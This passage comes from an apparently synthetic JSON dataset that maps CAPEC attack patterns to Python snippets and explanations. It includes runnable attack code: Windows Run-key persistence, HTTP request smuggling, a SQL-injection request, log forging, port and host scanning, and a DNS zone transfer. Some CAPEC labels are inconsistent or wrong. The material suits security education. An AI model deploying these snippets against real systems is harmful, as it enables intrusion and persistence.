        "description": "This Python code snippet demonstrates a function `read_file` that is vulnerable to the 'Leverage Alternate Encoding' attack. The function attempts to validate user input before canonicalizing it, which is a common mistake (CWE-180). The input is checked for '..' and '%2e%2e' (URL-encoded '..') to prevent directory traversal, but this validation is ineffective because it occurs before decoding the input. The function also allows external control of the file path (CWE-73), which can be exploited if the input is not properly sanitized. This code highlights the importance of proper input validation and canonicalization to prevent security vulnerabilities."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "import logging\nimport os\n\n# Setup logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n# Function to log user actions\ndef log_user_action(user, action):\n    logging.info(f'User: {user}, Action: {action}')\n\n# Simulate an attacker manipulating the log file\nif os.path.exists('app.log'):\n    with open('app.log', 'a') as log_file:\n        log_file.write('User: admin, Action: deleted all records\\n')\n\n# Log a normal user action\nlog_user_action('user123', 'logged in')",
        "description": "This Python code snippet demonstrates a logging mechanism that is vulnerable to audit log manipulation. The `log_user_action` function logs user actions to a file named 'app.log'. However, the code also includes a section where an attacker can directly manipulate the log file by appending a forged log entry ('User: admin, Action: deleted all records'). This represents the CAPEC of Audit Log Manipulation, where insufficient access controls allow an attacker to inject or manipulate log entries. The related CWEs are illustrated by the lack of proper output neutralization (CWE-117), potential insertion of sensitive information (CWE-532), and exposure of sensitive system information (CWE-497)."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "import winreg\n\n# CWE-314: Cleartext Storage in the Registry\n# Storing sensitive information in cleartext in the Windows Registry\ntry:\n    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\MyApp', 0, winreg.KEY_WRITE)\n    winreg.SetValueEx(registry_key, 'SensitiveData', 0, winreg.REG_SZ, 'my_secret_password')\n    winreg.CloseKey(registry_key)\nexcept WindowsError as e:\n    print(f'Registry manipulation failed: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-203: Manipulate Application Registry Values, specifically CWE-314: Cleartext Storage in the Registry. The code opens a registry key and stores sensitive information ('my_secret_password') in cleartext. This practice is insecure as it exposes sensitive data to potential attackers who can access the registry. The code highlights the risk of storing sensitive information in an unprotected manner within the Windows Registry."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import winreg\n\n# Define the registry key and value\nkey_path = r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'\nvalue_name = 'MaliciousApp'\nexecutable_path = r'C:\\Path\\To\\MaliciousApp.exe'\n\n# Open the registry key\ntry:\n    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)\nexcept FileNotFoundError:\n    reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)\n\n# Set the value to run the malicious executable at startup\nwinreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, executable_path)\nwinreg.CloseKey(reg_key)\n\nprint(f'Successfully added {value_name} to run at startup.')",
        "description": "This Python code snippet demonstrates how an adversary can modify the Windows registry to add a new entry to the 'Run' keys, ensuring that a malicious application is executed every time a user logs in. The code opens or creates the specified registry key and sets a value that points to the path of the malicious executable. This embodies the CAPEC 'Modification of Registry Run Keys' by showing how an attacker can achieve persistence on a target system. The code also touches on CWE-15 (External Control of System or Configuration Setting) by allowing external control over the registry settings, and CWE-314 (Cleartext Storage in the Registry) by storing the executable path in cleartext."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Load and parse the XML schema\nschema_path = 'schema.xsd'\ntree = ET.parse(schema_path)\nroot = tree.getroot()\n\n# Vulnerable code: allowing external input to modify the schema\nuser_input = '<xs:element name=\"malicious\" type=\"xs:string\"/>'\nroot.append(ET.fromstring(user_input))\n\n# Save the modified schema\nwith open(schema_path, 'wb') as f:\n    tree.write(f)\n\n# Load and parse an XML file using the modified schema\nxml_path = 'data.xml'\nxml_tree = ET.parse(xml_path)\nxml_root = xml_tree.getroot()\n\n# Process the XML data (potentially using the poisoned schema)\nfor elem in xml_root:\n    print(elem.tag, elem.text)",
        "description": "This Python code snippet demonstrates a schema poisoning vulnerability. It loads an XML schema from a file, then allows external input to modify the schema by appending a user-provided XML element. The modified schema is saved back to the file. Later, an XML file is parsed using the potentially poisoned schema, which could lead to unexpected behavior or security issues. This example embodies the CAPEC concept of Schema Poisoning and incorporates related CWEs such as External Control of System or Configuration Setting (CWE-15) and Trust Boundary Violation (CWE-501)."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable function to establish a communication channel\n\ndef vulnerable_communication(host, port, message):\n    try:\n        # Create a socket object\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # Connect to the server\n        s.connect((host, port))\n        \n        # Send the message\n        s.sendall(message.encode('utf-8'))\n        \n        # Receive the response\n        response = s.recv(1024)\n        \n        # Print the response\n        print('Received:', response.decode('utf-8'))\n        \n    except Exception as e:\n        print('An error occurred:', e)\n    finally:\n        s.close()\n\n# Example usage\nvulnerable_communication('example.com', 80, 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')",
        "description": "This Python code snippet demonstrates a vulnerable communication channel that can be exploited based on the CAPEC description and related CWEs. The function `vulnerable_communication` establishes a TCP connection to a specified host and port, sends a message, and prints the response. The code does not verify the source of the communication channel (CWE-940), does not ensure message integrity (CWE-924), and does not correctly specify the intended destination (CWE-941). This makes it susceptible to various attacks such as impersonation, message tampering, and reflection attacks. The example usage shows a simple HTTP GET request to 'example.com', which can be easily manipulated by an adversary."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "import socket\n\n# Vulnerable HTTP Response Smuggling Example\n\n# Create a socket connection to the backend server\nbackend_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nbackend_socket.connect(('backend.server', 80))\n\n# Malicious HTTP request with CRLF injection\nmalicious_request = \"GET / HTTP/1.1\\r\\nHost: backend.server\\r\\nContent-Length: 0\\r\\n\\r\\nGET /malicious HTTP/1.1\\r\\nHost: backend.server\\r\\n\\r\\n\"\n\n# Send the malicious request to the backend server\nbackend_socket.sendall(malicious_request.encode('utf-8'))\n\n# Receive the response from the backend server\nresponse = backend_socket.recv(4096)\nprint(response.decode('utf-8'))\n\nbackend_socket.close()",
        "description": "This Python code snippet demonstrates a basic example of HTTP Response Smuggling. The code creates a socket connection to a backend server and sends a malicious HTTP request that includes CRLF sequences to inject an unauthorized HTTP response. The backend server processes the injected request, leading to an inconsistent interpretation of HTTP requests between the client and the server. This example embodies the main idea of CAPEC-33 (HTTP Response Smuggling) and highlights related CWEs such as CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers) and CWE-444 (Inconsistent Interpretation of HTTP Requests)."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "from flask import Flask, request, abort\n\napp = Flask(__name__)\n\n@app.route('/admin', methods=['GET'])\ndef admin_panel():\n    if request.method != 'GET':\n        abort(403)  # Only allow GET requests\n    # Simulate sensitive data access\n    return 'Sensitive admin data'\n\n@app.route('/user', methods=['GET', 'POST'])\ndef user_panel():\n    if request.method == 'GET':\n        return 'User data'\n    elif request.method == 'POST':\n        # Simulate sensitive data modification\n        return 'User data modified'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application with two routes: '/admin' and '/user'. The '/admin' route is intended to be accessed only via GET requests, and any other HTTP verb will result in a 403 Forbidden error. This demonstrates the concept of HTTP Verb Tampering, where an attacker might try to use a different HTTP verb to bypass access restrictions. The '/user' route allows both GET and POST requests, simulating a scenario where sensitive data can be accessed or modified. The code highlights the potential vulnerability of relying solely on HTTP verbs for access control, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "import socket\nimport http.server\nimport socketserver\n\nclass RebindingHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        if self.path == '/rebind':\n            # Initial DNS resolution to attacker's controlled IP\n            initial_ip = '192.0.2.1'  # Attack controlled IP\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(b'Initial contact with attacker controlled IP')\n            # Simulate DNS rebinding to internal IP\n            internal_ip = '10.0.0.1'  # Internal IP within target organization\n            socket.gethostbyname = lambda x: internal_ip\n            self.wfile.write(b'Now rebinding to internal IP')\n        else:\n            self.send_response(404)\n            self.end_headers()\n\n# Bind to all interfaces (0.0.0.0) - CWE-1327\nwith socketserver.TCPServer(('0.0.0.0', 8080), RebindingHandler) as httpd:\n    print('Serving on port 8080')\n    httpd.serve_forever()",
        "description": "This Python code snippet demonstrates a simplified DNS rebinding attack. The `RebindingHandler` class handles HTTP GET requests. When the path '/rebind' is accessed, it first simulates an initial DNS resolution to an attacker's controlled IP address. Then, it simulates a DNS rebinding by changing the IP address resolution to an internal IP address within the target organization. The server binds to all interfaces (0.0.0.0), which is a common misconfiguration (CWE-1327). This code represents the main idea of DNS rebinding (CAPEC-350) by showing how an attacker can manipulate DNS resolution to access internal network resources."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable function to send sensitive data\ndef send_sensitive_data(data):\n    # CWE-319: Cleartext Transmission of Sensitive Information\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect(('example.com', 80))\n        s.sendall(data.encode('utf-8'))\n\n# Vulnerable function to receive data without integrity check\ndef receive_data():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.bind(('0.0.0.0', 8080))\n        s.listen()\n        conn, addr = s.accept()\n        with conn:\n            data = conn.recv(1024)\n            # CWE-924: Improper Enforcement of Message Integrity During Transmission\n            return data.decode('utf-8')\n\n# Main function demonstrating inter-component protocol manipulation\nif __name__ == '__main__':\n    sensitive_data = 'username=admin&password=secret'\n    send_sensitive_data(sensitive_data)\n    received_data = receive_data()\n    print(f'Received data: {received_data}')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of inter-component communication. The `send_sensitive_data` function transmits sensitive information in cleartext (CWE-319), making it susceptible to interception by unauthorized actors. The `receive_data` function receives data without verifying its integrity (CWE-924), allowing potential manipulation during transmission. These vulnerabilities highlight the risks associated with improper handling of inter-component protocols, as described in the CAPEC. An attacker could exploit these weaknesses to impersonate, intercept, or manipulate the communication between components."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Sample XML data with sensitive information\nxml_data = '''\n<order>\n    <customer>\n        <name>John Doe</name>\n        <creditCard>1234-5678-9012-3456</creditCard>\n    </customer>\n    <items>\n        <item>\n            <id>1</id>\n            <name>Widget</name>\n            <price>19.99</price>\n        </item>\n    </items>\n</order>\n'''\n\ndef process_order(xml_string):\n    try:\n        # Parse the XML data\n        root = ET.fromstring(xml_string)\n\n        # Extract customer name (potentially sensitive information)\n        customer_name = root.find('.//customer/name').text\n        print(f'Processing order for {customer_name}')\n\n        # Extract credit card information (sensitive information)\n        credit_card = root.find('.//customer/creditCard').text\n        print(f'Credit Card: {credit_card}')\n\n        # Process items\n        for item in root.findall('.//item'):\n            item_id = item.find('id').text\n            item_name = item.find('name').text\n            item_price = item.find('price').text\n            print(f'Item {item_id}: {item_name} - ${item_price}')\n\n    except ET.ParseError as e:\n        print(f'Error parsing XML: {e}')\n\n# Simulate receiving and processing an order\nprocess_order(xml_data)\n",
        "description": "This Python code snippet demonstrates a vulnerable implementation of processing XML data, embodying the main idea of CAPEC-271 (Data Interchange Protocol Manipulation). The code parses an XML string containing an order with customer and item details. It extracts and prints sensitive information such as the customer's name and credit card number without proper validation or sanitization. This example highlights several related CWEs:\n\n1. CWE-707 (Improper Neutralization): The code does not ensure that the XML data is well-formed or sanitized before processing.\n2. CWE-201 (Insertion of Sensitive Information Into Sent Data): The code extracts and prints sensitive information (credit card number) that should not be exposed.\n3. CWE-302 (Authentication Bypass by Assumed-Immutable Data): The code assumes that the XML data is immutable and trustworthy, which can be exploited by an attacker to manipulate the data.\n\nThis snippet illustrates how improper handling of data interchange protocols can lead to security vulnerabilities, such as unauthorized access to sensitive information and potential impersonation attacks."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "import requests\n\n# Vulnerable web service endpoint\nurl = 'http://example.com/api/getUserData'\n\n# Maliciously crafted parameters\nparams = {\n    'userId': '1 OR 1=1',  # SQL Injection\n    'action': 'deleteUser'  # Unauthorized action\n}\n\n# Sending the manipulated request\nresponse = requests.get(url, params=params)\n\n# Output the response\nprint(response.text)",
        "description": "This Python code snippet demonstrates a web service protocol manipulation attack. The code sends a GET request to a vulnerable web service endpoint with maliciously crafted parameters. The 'userId' parameter includes an SQL injection payload ('1 OR 1=1'), and the 'action' parameter attempts to perform an unauthorized action ('deleteUser'). This manipulation can cause the web application to behave unexpectedly, potentially exposing sensitive data or allowing unauthorized actions. The code embodies the main idea of CAPEC-252 (Web Services Protocol Manipulation) and highlights related CWEs such as CWE-707 (Improper Neutralization) and CWE-602 (Client-Side Enforcement of Server-Side Security)."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "import requests\n\n# SOAP request with potential for manipulation\nsoap_request = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:Login>\n         <web:username>admin</web:username>\n         <web:password>password</web:password>\n      </web:Login>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Sending the SOAP request to the server\nresponse = requests.post('http://example.com/webservice', data=soap_request, headers={'Content-Type': 'text/xml'})\n\n# Print the response from the server\nprint(response.text)\n",
        "description": "This Python code snippet demonstrates a SOAP request that could be manipulated by an adversary. The SOAP request is sent to a web service endpoint, and the response is printed. The code does not validate or sanitize the SOAP parameters, making it vulnerable to SOAP manipulation attacks. This example embodies the main idea of CAPEC-### (SOAP Manipulation) and highlights related CWEs such as CWE-707 (Improper Neutralization), CWE-602 (Client-Side Enforcement of Server-Side Security), and CWE-603 (Use of Client-Side Authentication). An attacker could modify the SOAP request to bypass authentication or inject malicious data, leading to undesirable behavior on the server."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "import requests\n\n# Vulnerable SOAP request\nwsdl_url = 'http://example.com/service?wsdl'\n\n# Exposing WSDL file containing sensitive information (CWE-651)\nresponse = requests.get(wsdl_url)\nprint(response.text)\n\n# SOAP request with potential for parameter tampering\nsoap_body = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservice\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:SomeService>\n         <web:parameter>malicious_value</web:parameter>\n      </web:SomeService>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\nheaders = {'Content-Type': 'text/xml'}\n\n# Sending the tampered SOAP request\nresponse = requests.post('http://example.com/service', data=soap_body, headers=headers)\nprint(response.text)\n\n# Capture-replay vulnerability (CWE-294)\n# Replaying the same request to bypass authentication\nreplay_response = requests.post('http://example.com/service', data=soap_body, headers=headers)\nprint(replay_response.text)",
        "description": "This Python code snippet demonstrates a SOAP parameter tampering attack, which is now part of CAPEC-279: SOAP Manipulation. The code first exposes a WSDL file (CWE-651), which may contain sensitive information about the web service. It then constructs a SOAP request with a potentially malicious parameter value and sends it to the server. The same request is replayed to illustrate a capture-replay vulnerability (CWE-294), which could bypass authentication if the server does not properly handle such scenarios. This code highlights the risks associated with improper handling of SOAP requests and the exposure of WSDL files."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "import os\nimport socket\n\n# Function to send ICMP Echo Request (Ping)\ndef send_ping(target_ip):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    \n    # ICMP Echo Request packet\n    icmp_packet = b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # Type 8 (Echo Request), Code 0\n    \n    # Send the packet to the target IP\n    sock.sendto(icmp_packet, (target_ip, 1))\n    \n    # Receive the response\n    response, _ = sock.recvfrom(1024)\n    \n    # Check if the response is an ICMP Echo Reply (Type 0)\n    if response[20] == 0:\n        print(f\"Host {target_ip} is alive\")\n    else:\n        print(f\"No response from {target_ip}\")\n\n# Example usage\nsend_ping('192.168.1.1')",
        "description": "This Python code snippet demonstrates how to send an ICMP Echo Request (Ping) to a target IP address to check if the host is responsive. The code creates a raw socket and constructs an ICMP Echo Request packet (Type 8). It then sends this packet to the target IP and waits for an ICMP Echo Reply (Type 0). If a reply is received, it indicates that the host is alive. This code embodies the main idea of the CAPEC by showing how an adversary might use a Ping to determine if a target system is responsive. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200) and cleartext transmission (CWE-319), which could be exploited during such network interactions."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "import socket\n\n# Vulnerable code: TCP SYN Scan\n# This code attempts to scan open ports on a target machine\n\ndef syn_scan(target_ip, start_port, end_port):\n    for port in range(start_port, end_port + 1):\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(1)\n            sock.connect((target_ip, port))\n            print(f'Port {port} is open')\n            sock.close()\n        except (socket.timeout, ConnectionRefusedError):\n            pass\n\n# Example usage\nsyn_scan('192.168.1.1', 1, 1024)\n",
        "description": "This Python code snippet demonstrates a basic TCP SYN scan, which is used to determine the status of ports on a remote target. The code iterates over a range of ports and attempts to establish a connection to each port on the target IP address. If a connection is successful, it prints that the port is open. This type of scan can expose sensitive information about the target's open ports (CWE-200) and can be used to identify services running on those ports. The code also highlights the potential for excessive attack surface (CWE-1125) by scanning a wide range of ports. Additionally, the use of cleartext transmission (CWE-319) in the socket connection can be sniffed by unauthorized actors. This code is a simple example of how an adversary might perform system reconnaissance using a SYN scan."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# ICMP Echo Request (Ping) Packet\nICMP_ECHO_REQUEST = 8\n\n# Function to calculate checksum\ndef checksum(source_string):\n    sum = 0\n    count_to = (len(source_string) // 2) * 2\n    count = 0\n    while count < count_to:\n        this_val = source_string[count + 1] * 256 + source_string[count]\n        sum = sum + this_val\n        sum = sum & 0xffffffff\n        count = count + 2\n    if count_to < len(source_string):\n        sum = sum + source_string[len(source_string) - 1]\n        sum = sum & 0xffffffff\n    sum = (sum >> 16) + (sum & 0xffff)\n    sum = sum + (sum >> 16)\n    answer = ~sum\n    answer = answer & 0xffff\n    answer = answer >> 8 | (answer << 8 & 0xff00)\n    return answer\n\n# Function to create an ICMP packet\ndef create_packet(id):\n    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, id, 1)\n    data = struct.pack('d', time.time())\n    my_checksum = checksum(header + data)\n    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), id, 1)\n    return header + data\n\n# Function to send ICMP Echo Request\ndef send_ping(dest_addr, timeout=1):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        packet_id = int((id(timeout) * time.time()) % 65535)\n        packet = create_packet(packet_id)\n        sock.sendto(packet, (dest_addr, 1))\n        sock.settimeout(timeout)\n        start_time = time.time()\n        while True:\n            recv_packet, addr = sock.recvfrom(1024)\n            icmp_header = recv_packet[20:28]\n            type, code, checksum, p_id, sequence = struct.unpack('bbHHh', icmp_header)\n            if p_id == packet_id:\n                return True\n            if time.time() - start_time > timeout:\n                return False\n    except Exception as e:\n        return False\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '8.8.8.8'  # Example target IP\n    if send_ping(target_ip):\n        print(f'{target_ip} is reachable')\n    else:\n        print(f'{target_ip} is not reachable')",
        "description": "This Python code snippet demonstrates the creation and sending of an ICMP Echo Request (Ping) packet to a target IP address. The code constructs an ICMP packet, calculates its checksum, and sends it using a raw socket. The function `send_ping` waits for a response and checks if the received packet matches the sent packet by comparing the packet ID. This code embodies the main idea of the deprecated CAPEC-285, which involves using ICMP Echo Requests for network diagnostics or potential attacks. The related CWE-294 (Authentication Bypass by Capture-replay) is indirectly relevant as ICMP packets can be captured and replayed in network attacks. The code also touches on CWE-589 (Call to Non-ubiquitous API) as it uses raw sockets, which may not be supported on all platforms or require elevated privileges."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-287: Authentication Bypass\n# CWE-1316: Overlapping Protected and Unprotected Ranges\n# CWE-1229: Creation of Emergent Resource\n\ndef check_authentication(user):\n    # Simulate an authentication check\n    if user == 'admin':\n        return True\n    return False\n\n# Vulnerable function that allows bypassing authentication\n# by exploiting overlapping address ranges and emergent resources\n\ndef execute_command(user, command):\n    if check_authentication(user):\n        # Simulate protected command execution\n        subprocess.run(command, shell=True)\n    else:\n        # Overlapping range allows execution without proper authentication\n        if 'unprotected' in command:\n            subprocess.run(command, shell=True)\n        else:\n            print('Access Denied')\n\n# Example usage\nexecute_command('guest', 'unprotected ls')  # This should not be allowed but is executed\nexecute_command('guest', 'protected ls')    # This should be denied\nexecute_command('admin', 'protected ls')    # This should be allowed",
        "description": "This Python code snippet demonstrates a vulnerable function `execute_command` that simulates an authentication bypass issue (CWE-287) by exploiting overlapping protected and unprotected address ranges (CWE-1316) and the creation of emergent resources (CWE-1229). The `check_authentication` function checks if the user is 'admin'. The `execute_command` function allows command execution if the user is authenticated. However, due to the overlapping range check (`'unprotected' in command`), a non-authenticated user can execute commands that should be protected, representing a security flaw. This embodies the main idea of the deprecated CAPEC pattern by showing how infrastructure-based footprinting can lead to security vulnerabilities."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "import dns.resolver\n\n# Function to enumerate MX records for a given domain\ndef enumerate_mx_records(domain):\n    try:\n        mx_records = dns.resolver.resolve(domain, 'MX')\n        for mx in mx_records:\n            print(f'MX Record: {mx.exchange} with priority {mx.preference}')\n    except dns.resolver.NoAnswer:\n        print('No MX records found.')\n    except dns.resolver.NXDOMAIN:\n        print('Domain does not exist.')\n    except Exception as e:\n        print(f'An error occurred: {e}')\n\n# Example usage\ndomain = 'example.com'\nenumerate_mx_records(domain)",
        "description": "This Python code snippet demonstrates how to enumerate MX (Mail Exchange) records for a given domain using the 'dns.resolver' module. The function 'enumerate_mx_records' takes a domain name as input and attempts to resolve its MX records. If successful, it prints out the MX records along with their priority. The code handles exceptions for cases where no MX records are found, the domain does not exist, or other errors occur. This snippet embodies the main idea of CAPEC-Enumerate Mail Exchange (MX) Records by showing how an adversary might gather information about mail servers in a network. The related CWEs are indirectly represented by the potential exposure of sensitive information (CWE-200), reliance on DNS resolution (CWE-350), and handling of communication channels (CWE-941)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "import dns.query\nimport dns.zone\nimport dns.resolver\n\n# Vulnerable DNS server address\nvulnerable_dns_server = '192.0.2.1'\n\ntry:\n    # Attempting a DNS zone transfer\n    zone = dns.zone.from_xfr(dns.query.xfr(vulnerable_dns_server, 'example.com'))\n    for name, node in zone.nodes.items():\n        print(zone[name].to_text(name))\nexcept Exception as e:\n    print(f'Zone transfer failed: {e}')",
        "description": "This Python code snippet demonstrates a DNS zone transfer attempt, which is a common vulnerability when DNS servers are misconfigured to allow such transfers. The code uses the `dnspython` library to query a DNS server for a zone transfer of the 'example.com' domain. If the server is misconfigured and allows the transfer, the code will print out the DNS records, potentially exposing sensitive information about the network topology, including IP addresses and hostnames. This embodies the main idea of the CAPEC 'DNS Zone Transfers' and highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by showing how an attacker can exploit this misconfiguration to gather sensitive data."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "import socket\nimport struct\n\n# Function to send a ping request\ndef send_ping(ip):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.settimeout(1)\n\n        # ICMP header: Type (8), Code (0), Checksum (0), ID, Sequence\n        header = struct.pack('bbHHh', 8, 0, 0, 1, 1)\n        data = b'\\x42' * 48  # Payload\n        checksum = calculate_checksum(header + data)\n        header = struct.pack('bbHHh', 8, 0, checksum, 1, 1)\n        packet = header + data\n\n        # Send the packet\n        sock.sendto(packet, (ip, 1))\n\n        # Receive the response\n        response, _ = sock.recvfrom(1024)\n        if response:\n            print(f'Host {ip} is alive')\n    except socket.timeout:\n        print(f'Host {ip} is not responding')\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Function to calculate checksum\ndef calculate_checksum(source_string):\n    count_to = (len(source_string) // 2) * 2\n    sum = 0\n    count = 0\n    while count < count_to:\n        this_val = source_string[count + 1] * 256 + source_string[count]\n        sum = sum + this_val\n        sum = sum & 0xffffffff\n        count = count + 2\n    if count_to < len(source_string):\n        sum = sum + source_string[len(source_string) - 1]\n        sum = sum & 0xffffffff\n    sum = (sum >> 16) + (sum & 0xffff)\n    sum = sum + (sum >> 16)\n    answer = ~sum\n    answer = answer & 0xffff\n    answer = answer >> 8 | (answer << 8 & 0xff00)\n    return answer\n\n# Example usage\nsend_ping('192.168.1.1')",
        "description": "This Python code snippet demonstrates a basic implementation of a 'ping' scan, which is a common method used in host discovery (CAPEC-292). The code sends an ICMP echo request to a specified IP address and waits for a response to determine if the host is alive. The function `send_ping` creates a raw socket, constructs an ICMP packet, sends it to the target IP, and listens for a response. If a response is received, it indicates that the host is alive. The `calculate_checksum` function is used to compute the checksum for the ICMP packet. This code snippet embodies the concept of host discovery and highlights potential vulnerabilities such as exposure of sensitive information (CWE-200) and reliance on IP address for authentication (CWE-291)."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to perform a traceroute\ndef traceroute(target, max_hops=30):\n    port = 33434\n    ttl = 1\n    while ttl <= max_hops:\n        recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        send_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n        send_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)\n        recv_socket.bind(('', port))\n        send_socket.sendto(b'', (target, port))\n        start_time = time.time()\n        try:\n            data, curr_addr = recv_socket.recvfrom(512)\n            curr_addr = curr_addr[0]\n            elapsed_time = (time.time() - start_time) * 1000\n            print(f'{ttl}\t{curr_addr}\t{elapsed_time:.2f} ms')\n        except socket.error:\n            print(f'{ttl}\t*\tRequest timed out.')\n        finally:\n            send_socket.close()\n            recv_socket.close()\n        ttl += 1\n\n# Example usage\ntraceroute('8.8.8.8')",
        "description": "This Python code snippet performs a traceroute to a specified target (in this case, Google's public DNS server at 8.8.8.8). The traceroute function sends UDP packets with incrementing TTL values to map out the route data takes to reach the target. Each hop along the route sends back an ICMP 'Time Exceeded' message, which is captured and displayed. This process helps in constructing a network topology, which can expose sensitive information about the network's structure (CWE-200, CWE-497). The code also transmits data in cleartext (CWE-319), and the destination might be incorrectly specified (CWE-941), leading to potential exposure of sensitive information."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "import socket\n\n# Vulnerable code: ICMP Address Mask Request\n# This code sends an ICMP Type 17 Address Mask Request to a target IP address\n\ndef send_icmp_address_mask_request(target_ip):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    \n    # ICMP Type 17 (Address Mask Request) header\n    icmp_header = b'\\x11\\x00\\x00\\x00'  # Type 17, Code 0, Checksum 0 (for simplicity)\n    \n    # Send the ICMP Address Mask Request\n    sock.sendto(icmp_header, (target_ip, 0))\n    \n    # Receive the ICMP Address Mask Reply\n    response, _ = sock.recvfrom(1024)\n    \n    # Extract and print the address mask from the response\n    address_mask = response[20:24]\n    print(f'Address Mask: {socket.inet_ntoa(address_mask)}')\n\n# Example usage\nsend_icmp_address_mask_request('192.168.1.1')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of sending an ICMP Type 17 Address Mask Request to a target IP address. The code creates a raw socket and sends an ICMP Address Mask Request, then waits for and processes the ICMP Address Mask Reply. This type of request can expose sensitive network configuration information, such as subnet masks, default gateways, and broadcast addresses, to unauthorized actors. The code also implicitly relies on the IP address for communication, which can be exploited if the IP address is used for authentication (CWE-291). Additionally, the code does not restrict the communication channel to intended endpoints (CWE-923), making it susceptible to interception or redirection by an attacker."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
